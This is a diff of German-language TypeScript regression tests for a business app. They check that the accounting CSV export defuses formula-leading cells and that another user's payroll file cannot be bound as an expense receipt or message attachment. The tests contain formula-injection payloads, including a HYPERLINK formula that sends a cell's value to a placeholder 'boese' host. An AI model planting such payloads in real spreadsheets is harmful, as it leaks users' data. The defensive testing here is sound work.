@@ -4,6 +4,7 @@ import assert from 'node:assert/strict';
 import { BASE_URL, data, del, get, post, requireServer } from '../helpers/client';
 import { loginAll, type AccountName } from '../helpers/accounts';
 import { schutzfreiAufraeumen, testDb, testDbGrund, testDbSchliessen } from '../helpers/testdb';
+import { zuercherHeute } from '../helpers/datum';
 
 /**
  * Wave 13 — Finanzbelege: Unveränderlichkeit in der Datenbank, Storno statt
@@ -240,6 +241,116 @@ describe('Gutschriften', () => {
     assert.equal((await get('/api/credit-notes', { jar: jars.manager })).status, 200);
     for (const rolle of ['employee', 'customer'] as AccountName[]) {
       assert.equal((await get('/api/credit-notes', { jar: jars[rolle] })).status, 403, rolle);
+    }
+  });
+});
+
+/**
+ * Ausgaben: Export und Belege (2026-09-27).
+ *
+ * Zwei Befunde, beide an echten Wegen geprüft:
+ *
+ *  • Der Buchhaltungsexport schrieb Freitext — Beschreibung, Beleg — roh in
+ *    die CSV. Eine Beschreibung `=HYPERLINK(…)` ist in Excel und LibreOffice
+ *    eine Formel (CSV/Formula Injection). Jetzt beginnt eine solche Zelle mit
+ *    einem Apostroph; negative Beträge bleiben unberührt.
+ *  • Die Ausgabe band jede Datei der Organisation als Beleg und schrieb
+ *    ihren Zweck um — eine Lohnabrechnung wurde zum Beleg und für jede Rolle
+ *    mit `expense:read` lesbar.
+ */
+describe('Ausgaben: Formeln im Export, fremde Dateien als Beleg', () => {
+  const MARKE_AUSGABE = `Prüfreihe Ausgabe ${Date.now()}`;
+  let lohnDatei = '';
+
+  before(async () => {
+    const db = testDb();
+    if (!db) return;
+    const org = (await db.organization.findFirstOrThrow({ where: { slug: 'clenaris' }, select: { id: true } })).id;
+    lohnDatei = (
+      await db.fileAsset.create({
+        data: { organizationId: org, scope: 'PAYROLL', scanStatus: 'CLEAN', checksum: 'b'.repeat(64), path: 'pruef/lohn.pdf', url: 'pruef/lohn.pdf', filename: `${MARKE_AUSGABE}.pdf`, mimeType: 'application/pdf', sizeBytes: 10, provenance: 'SYSTEM_GENERATED' },
+      })
+    ).id;
+  });
+
+  after(async () => {
+    const db = testDb();
+    if (!db) return;
+    await db.fileAsset.deleteMany({ where: { filename: { startsWith: 'Prüfreihe Ausgabe' } } });
+    await db.expense.deleteMany({ where: { OR: [{ description: { contains: 'HYPERLINK' } }, { notes: { startsWith: 'Prüfreihe Ausgabe' } }] } });
+  });
+
+  it('csvZelle: Formelanfänge entschärft, Zahlen und Text unberührt', async () => {
+    const { csvZelle } = await import('../../src/lib/csv');
+    assert.equal(csvZelle('=1+1'), "'=1+1");
+    assert.equal(csvZelle('+41 79 000 00 00'), "'+41 79 000 00 00");
+    assert.equal(csvZelle('@SUM(A1)'), "'@SUM(A1)");
+    assert.equal(csvZelle('\t=cmd'), "'\t=cmd");
+    assert.equal(csvZelle('-12.50'), '-12.50', 'ein negativer Betrag ist keine Formel');
+    assert.equal(csvZelle('Reinigung'), 'Reinigung');
+    assert.equal(csvZelle('a;b'), '"a;b"');
+    assert.equal(csvZelle('=HYPERLINK("x")'), `"'=HYPERLINK(""x"")"`);
+  });
+
+  it('der Buchhaltungsexport enthält keine Zelle, die mit einer Formel beginnt', async () => {
+    const heute = zuercherHeute().toISOString().slice(0, 10);
+    const ausgabe = await post(
+      '/api/expenses',
+      { description: '=HYPERLINK("https://boese.pruef.invalid/?"&A1,"Beleg")', reference: '+SUMME(A1)', expenseDate: heute, netAmount: 10, notes: MARKE_AUSGABE },
+      { jar: jars.admin },
+    );
+    assert.equal(ausgabe.status, 201, ausgabe.text);
+
+    const antwort = await fetch(`${BASE_URL}/api/exports/buchhaltung`, {
+      method: 'POST',
+      headers: { cookie: jars.admin, 'content-type': 'application/json' },
+      body: JSON.stringify({ format: 'csv', periodFrom: heute, periodTo: heute, include: ['expenses'] }),
+    });
+    assert.equal(antwort.status, 200);
+    const text = (await antwort.text()).replace(/^﻿/, '');
+    assert.ok(text.includes("'=HYPERLINK"), 'die Formel steht entschärft im Export');
+    for (const zeile of text.split(/\r?\n/)) {
+      for (const zelle of zeile.split(';')) {
+        const inhalt = zelle.replace(/^"/, '');
+        assert.ok(!/^[=+@]/.test(inhalt), `Zelle beginnt mit einer Formel: ${inhalt.slice(0, 40)}`);
+      }
+    }
+  });
+
+  it('eine fremde Datei (Lohnabrechnung) lässt sich nicht als Beleg anhängen — und bleibt, was sie war', async (t) => {
+    const db = testDb();
+    if (!db) return t.skip('keine Testdatenbank');
+    const r = await post(
+      '/api/expenses',
+      { description: 'Beleg mit fremder Datei', expenseDate: zuercherHeute().toISOString().slice(0, 10), netAmount: 5, notes: MARKE_AUSGABE, fileIds: [lohnDatei] },
+      { jar: jars.manager },
+    );
+    assert.equal(r.status, 404, r.text);
+    const datei = await db.fileAsset.findUniqueOrThrow({ where: { id: lohnDatei } });
+    assert.equal(datei.scope, 'PAYROLL', 'Zweck umgeschrieben');
+    assert.equal(datei.expenseId, null, 'an eine Ausgabe gebunden');
+    assert.equal(await db.expense.count({ where: { description: 'Beleg mit fremder Datei', notes: MARKE_AUSGABE } }), 0, 'die Ausgabe entstand trotzdem');
+  });
+
+  it('dieselbe Datei lässt sich auch nicht als Nachrichtenanhang binden — die Antwort scheitert ganz', async () => {
+    // Die Antwortroute band Dateien früher per `updateMany` mit nur
+    // Hochladende und `messageId: null` im Filter; eine Kennung, die nicht
+    // passte, fiel still weg. Jetzt teilt sie `dateienBinden` mit Buchung und
+    // Beleg, und die Nachricht entsteht nicht ohne ihren Anhang.
+    const db = testDb();
+    assert.ok(db && lohnDatei);
+    const verlauf = data(
+      await post<{ data: { id: string } }>('/api/messages', { subject: MARKE_AUSGABE, body: 'Eröffnung' }, { jar: jars.customer }),
+    );
+    try {
+      const r = await post(`/api/messages/${verlauf.id}`, { body: 'mit Anhang', fileIds: [lohnDatei] }, { jar: jars.customer });
+      assert.equal(r.status, 404, r.text);
+      const datei = await db.fileAsset.findUniqueOrThrow({ where: { id: lohnDatei } });
+      assert.equal(datei.messageId, null, 'an eine Nachricht gebunden');
+      assert.equal(await db.message.count({ where: { threadId: verlauf.id } }), 1, 'die Antwort entstand trotzdem');
+    } finally {
+      await db.message.deleteMany({ where: { threadId: verlauf.id } });
+      await db.messageThread.delete({ where: { id: verlauf.id } });
     }
   });
 });
